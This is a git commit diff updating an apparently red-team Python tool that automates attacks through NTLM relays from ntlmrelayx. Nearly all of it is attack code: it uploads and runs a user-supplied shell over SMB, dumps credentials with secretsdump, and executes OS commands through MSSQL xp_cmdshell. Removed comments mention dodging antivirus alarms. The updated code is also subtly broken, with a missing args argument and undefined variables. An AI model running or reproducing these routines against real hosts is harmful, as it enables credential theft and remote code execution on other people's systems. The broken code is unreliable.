ceaaea7b4bdfc6eb367f934c371813e9264b3e6b
Dylan Evans <62859381+fin3ss3g0d@users.noreply.github.com>
2024-02-01 15:12:01 -0500

    pre-release impacket_relay_gat.py update

--- impacket_relay_gat.py
+++ impacket_relay_gat.py
@@ -1,36 +1,87 @@
 #!/usr/bin/env python3
 # impacket_relay_gat.py
-# author: ad0nis (Aaron Pohl)
+# Authors: ad0nis (Aaron Pohl) & fin3ss3g0d (Dylan Evans)
 
+import sys
 import requests
 from subprocess import run, PIPE
+import concurrent.futures
+import argparse
 
 
-def main():
-    # make a request for the relay info against localhost
+def main():    
+    # Create the parser
+    parser = argparse.ArgumentParser(description='Relay-Gat: A tool to automate the exploitation of ntlmrelayx relays.')
+
+    # Add the 'threads' argument
+    # The type is set to int to make sure the input is an integer
+    # The default value is set to 10
+    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads to use')    
+    # Add Boolean arguments
+    parser.add_argument('--smb-shares', action='store_true', help='Enable listing of SMB shares')
+    parser.add_argument('--smb-shell', action='store_true', help='Enable execution of SMB shell')
+    parser.add_argument('--dump-secrets', action='store_true', help='Enable dumping of secrets')
+    parser.add_argument('--mssql-dbs', action='store_true', help='Enable listing of MSSQL databases')
+    parser.add_argument('--mssql-exec', action='store_true', help='Enable execution of MSSQL OS commands via xp_cmdshell & sp_start_job')    
+    # Add integer argument for the MSSQL exec method
+    parser.add_argument('--mssql-method', type=int, choices=[1, 2, 3], help='''Method to use for MSSQL exec:
+                                                                            1 - Uses xp_cmdshell for command execution.
+                                                                            2 - Uses sp_start_job to start a SQL Server Agent job.
+                                                                            3 - Enables xp_cmdshell, executes the command, and then disables xp_cmdshell. 
+                                                                            Warning: Method 3 can potentially leave xp_cmdshell enabled or disable it if the system was relying on it.''')                                 
+    # Add string arguments
+    parser.add_argument('--mssql-command', type=str, help='Command to execute for MSSQL exec method (OS command NOT SQL query)')
+    parser.add_argument('--shell-path', type=str, help='File path for the SMB shell option')
+
+    # Parse the arguments
+    args = parser.parse_args()
+
+    # Validate the arguments
+    validate_arguments(args)
+
+    # Make a request for the relay info against localhost
     relay_info = get_relay_info()
-    # handles each protocol ntlmrelayx supports and runs appropriate exploits in an appropriate order based off privileges.
+    # Handles each protocol ntlmrelayx supports and runs appropriate exploits based on selections
     handle_relay_info(relay_info)
+
+
+def validate_arguments(args):
+    # Check for at least one action argument
+    if not args.smb_shares and not args.smb_shell and not args.dump_secrets and not args.mssql_dbs and not args.mssql_exec:
+        print("Error: At least one action argument is required.")
+        sys.exit(1)
+
+    # Check for SMB shell argument dependency
+    if args.smb_shell and not args.shell_path:
+        print("Error: --shell-path is required when --smb-shell is selected.")
+        sys.exit(1)
+    
+    # Check for MSSQL exec argument dependencies
+    if args.mssql_exec:
+        if not args.mssql_command:
+            print("Error: --mssql-command is required when --mssql-exec is selected.")
+            sys.exit(1)
+        if args.mssql_method is None:
+            print("Error: --mssql-method is required when --mssql-exec is selected.")
+            sys.exit(1)
 
 
 def get_relay_info():
     # Basic test to get relay info for testing:
     # curl -v http://localhost:9090/ntlmrelayx/api/v1.0/relays | python -m json.tool
     url = 'http://localhost:9090/ntlmrelayx/api/v1.0/relays'
-    print("Attempting to retrieve list of active relays from '%s'." % (url))
+    print(f"Attempting to retrieve list of active relays from '{url}'.")
     print("Please ensure that you have ntlmrelayx.py running with active relays showing in 'socks' command output.")
     try:
         response = requests.get(url)
         values = response.json()
         return(values)
     except Exception as error:
-        print("Error:'%s' while gathering relay info from '%s'.\nCannot proceed without relay info. Are you sure you have ntlmrelayx running?" % (error, url))
-        # https://stackoverflow.com/questions/19747371/python-exit-commands-why-so-many-and-when-should-each-be-used
-        raise SystemExit(1)
+        print(f"Error:'{error}' while gathering relay info from '{url}'.\nCannot proceed without relay info. Are you sure you have ntlmrelayx running?")
+        sys.exit(1)
 
 
 def list_shares(relay_user, relay_host, relay_port, is_admin):
-    # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
     # echo "shares\nuse C$\nls\nexit\n" | proxychains smbclient.py -no-pass DOMAIN/USERNAME@1.2.3.4
     connection_string = relay_user + "@" + relay_host
     input = ''
@@ -38,52 +89,51 @@ def list_shares(relay_user, relay_host, relay_port, is_admin):
         input = "shares\nuse C$\nls\nexit\n"
     else:
         input = "shares\nexit\n"
-    print("Attempting to list SMB shares as '%s'." % (connection_string))
+    print(f"Attempting to list SMB shares as '{connection_string}'.")
     try:
-        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
+        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
             input=input, encoding='ascii')
         print(proc.stdout)
+        with open(f'smb_shares.{relay_user.replace("/", ".")}.{relay_host}.txt', 'w+') as file:
+            file.write(f'{proc.stdout}')
     except Exception as error:
-        print("Error: '%s' listing SMB shares as '%s'." % (error, connection_string))
+        print(f"Error: '{error}' listing SMB shares as '{connection_string}'.")
 
 
-def smb_shell(relay_user, relay_host, relay_port):
-    # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
+def smb_shell(relay_user, relay_host, relay_port, shell_path):
     connection_string = relay_user + "@" + relay_host
-    input = "shares\nuse C$\nls\nmkdir CBI\ncd CBI\nput CBI.exe\nls\nexit\n"
+    input = f"shares\nuse C$\nls\ncd Users\\Public\nput {shell_path}\nls\nexit\n"
 
-    print("Attempting to upload CBI.exe to C:\CBI\CBI.exe as '%s'." % (connection_string))
+    print(f"Attempting to upload {shell_path} to C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
     try:
-        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
+        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
             input=input, encoding='ascii')
         print(proc.stdout)
     except Exception as error:
-        print("Error: '%s' listing SMB shares as '%s'." % (error, connection_string))
-    print("Attempting to smbexec C:\CBI\CBI.exe as '%s'." % (connection_string))
+        print(f"Error: '{error}' uploading C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
+    print(f"Attempting to smbexec C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
     try:
-        proc2 = run(['proxychains', 'smbexec.py', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
-            input='C:\\CBI\\CBI.exe\nexit\n', encoding='ascii')
+        proc2 = run(['proxychains', 'smbexec.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
+            input=f'C:\\Users\\Public\\{shell_path}\nexit\n', encoding='ascii')
         print(proc2.stdout)
     except Exception as error:
-        print("Error: '%s' running smbexec as '%s'." % (error, connection_string))
+        print(f"Error: '{error}' running smbexec as '{connection_string}'.")
 
 
 def secretsdump(relay_user, relay_host):
-    # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
     connection_string = relay_user + "@" + relay_host
     out_user = relay_user.replace('/', '.')
-    outfile = str('secretsdump.%s.%s.txt' % (out_user, relay_host))
-    print("Attempting secretsdump.py as '%s'." % (connection_string))
+    outfile = f"secretsdump.{out_user}.{relay_host}.txt"
+    print(f"Attempting secretsdump.py as '{connection_string}'.")
     try:
-        proc = run(['proxychains', 'secretsdump.py', '-ts', '-no-pass', '-o', outfile, connection_string ], stdout=PIPE,
+        proc = run(['proxychains', 'secretsdump.py', '-ts', '-no-pass', '-o', outfile, connection_string], stdout=PIPE,
             input='', encoding='ascii')
         print(proc.stdout)
     except Exception as error:
-        print("Error: '%s' dumping secrets from '%s'." % (error, connection_string))
+        print(f"Error: '{error}' dumping secrets from '{connection_string}'.")
 
 
 def mssql_exec(relay_user, relay_host, relay_port, method, command):
-    # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
     connection_string = relay_user + "@" + relay_host
     if method == 1:
         input = "xp_cmdshell " + command + "\n"
@@ -95,45 +145,34 @@ def mssql_exec(relay_user, relay_host, relay_port, method, command):
         print('[!] This is not a recommended method, and could cause havoc.')
         input = "enable_xp_cmdshell\nxp_cmdshell " + command + "\ndisable_xp_cmdshell\n"
     try:
-        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
+        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
             input=input, encoding='ascii')
         print(proc.stdout)
     except Exception as error:
-        print("Error: '%s' executing command '" + command + "' as '%s'." % (error, connection_string))
-
-"""     print("Attempting to upload CBI.exe to C:\CBI\CBI.exe as '%s'." % (connection_string))
-    try:
-        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
-            input=input, encoding='ascii')
-        print(proc.stdout)
-    except Exception as error:
-        print("Error: '%s' listing SMB shares as '%s'." % (error, connection_string))
-    print("Attempting to smbexec C:\CBI\CBI.exe as '%s'." % (connection_string))
-    try:
-        proc2 = run(['proxychains', 'smbexec.py', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
-            input='C:\\CBI\\CBI.exe\nexit\n', encoding='ascii')
-        print(proc2.stdout)
-    except Exception as error:
-        print("Error: '%s' running smbexec as '%s'." % (error, connection_string)) """
+        print(f"Error: '{error}' executing command '{command}' as '{connection_string}'.")
 
 
 def list_databases(relay_user, relay_host, relay_port):
-    # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
-    # BAD EXAMPLE WILL UPDATE LATER >:D : echo "shares\nuse C$\nls\nexit\n" | proxychains smbclient.py -no-pass DOMAIN/USERNAME@1.2.3.4
     connection_string = relay_user + "@" + relay_host
     input = 'SELECT CURRENT_USER;\nSELECT name FROM master.sys.databases;\nexit\n'
-    print("Attempting to list current db user and MSSQL databases as '%s'." % (connection_string))
+    print(f"Attempting to list current db user and MSSQL databases as '{connection_string}'.")
     try:
-        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
+        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
             input=input, encoding='ascii')
         print(proc.stdout)
+        with open(f'mssql_databases.{relay_user.replace("/", ".")}.{relay_host}.txt', 'w+') as file:
+            file.write(f'{proc.stdout}')
     except Exception as error:
-        print("Error: '%s' listing MSSQL databases as '%s'." % (error, connection_string))
+        print(f"Error: '{error}' listing MSSQL databases as '{connection_string}'.")
 
 
-def handle_relay_info(relay_info):
+def handle_relay_info(relay_info, args):
     # example SMB: ["SMB", "1.2.3.4", "domain/user", "TRUE", "445"]
     # example MSSQL: ["MSSQL", "1.2.3.4", "DOMAIN/user", "N/A", "60183"]
+
+    # Initialize the ThreadPoolExecutor
+    executor = concurrent.futures.ThreadPoolExecutor(max_workers=args.threads)
+
     for relay in relay_info:
         # Break it up into usable bits...
         protocol = relay[0]
@@ -142,29 +181,20 @@ def handle_relay_info(relay_info):
         is_admin = relay[3]
         relay_port = relay[4]
 
-        if protocol == 'SMB' and is_admin == 'TRUE':
-            # SMB and Local admin
-            # list_shares first, as this is unlikely to trip any alarms.
-            # Take a shot at a shell second, as this may raise alarms, but is less likely to break the relay than secretsdump is IMO
-            # and especially against Cylance, which I was fighting while writing this. ;)
-            list_shares(relay_user, relay_host, relay_port, is_admin)
-            #smb_shell(relay_user, relay_host, relay_port)
-            secretsdump(relay_user, relay_host)
-        if protocol == 'SMB' and is_admin == 'FALSE':
-            list_shares(relay_user, relay_host, relay_port, is_admin)
-        if protocol == 'MSSQL':
-            list_databases(relay_user, relay_host, relay_port)
-            #method = 1      # Methods are 1,2,3 in order of safest to dirtiest.
-            #command = 'calc.exe'
-            #mssql_exec(relay_user, relay_host, relay_port, method, command)
-        if protocol == 'IMAP':
-            # TODO: do some magic. I've never played with this one, and will need some time with it.
-            # dump_emails()
-            print("IMAP is not implemented yet. Sorry. Good luck with that one.")
-        if protocol == 'HTTP':
-            # TODO: do some magic. Have only played with this with petitpotam, and even then without much success.
-            # petitpotam()
-            print("HTTP is not implemented yet. Sorry. Good luck with that one.")
+        if protocol == 'SMB' and args.dump_secrets:
+            if is_admin != 'TRUE':
+                print(f"Warning: secretsdump requires admin privileges. Skipping '{relay_user}'.")
+            else:
+                # SMB and local admin, so we can dump secrets
+                executor.submit(secretsdump, relay_user, relay_host)
+        if protocol == 'SMB' and args.smb_shares:
+            executor.submit(list_shares, relay_user, relay_host, relay_port, is_admin)
+        if protocol == 'SMB' and args.smb_shell:
+            executor.submit(smb_shell, relay_user, relay_host, relay_port, args.shell_path)
+        if protocol == 'MSSQL' and args.mssql_dbs:
+            executor.submit(list_databases, relay_user, relay_host, relay_port)
+        if protocol == 'MSSQL' and args.mssql_exec:
+            executor.submit(mssql_exec, relay_user, relay_host, relay_port, method, command)
 
 
 if __name__ == '__main__':
